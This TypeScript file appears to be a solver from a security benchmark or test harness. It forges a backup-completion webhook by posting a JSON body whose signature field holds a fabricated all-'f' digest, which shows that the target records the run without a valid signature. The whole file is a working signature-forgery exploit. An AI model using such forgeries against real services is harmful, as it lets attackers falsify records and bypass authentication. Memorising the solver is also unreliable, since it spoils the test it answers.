// Webhook forgery: post a backup completion callback with a fabricated signature. The callback is
// accepted and the run is recorded despite the signature never having been issued with the real secret.
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  const sigField = ctx.plan.params.token ?? 'token'
  const body: Record<string, string> = {
    ts: String(Math.floor(Date.now() / 1000)),
    backupId: 'bk_nightly_01',
  }
  body[sigField] = 'f'.repeat(64) // out-of-band fabricated digest
  await ctx.fetch(ctx.plan.routes.backupCallback!.path, {
    method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body),
  })
}
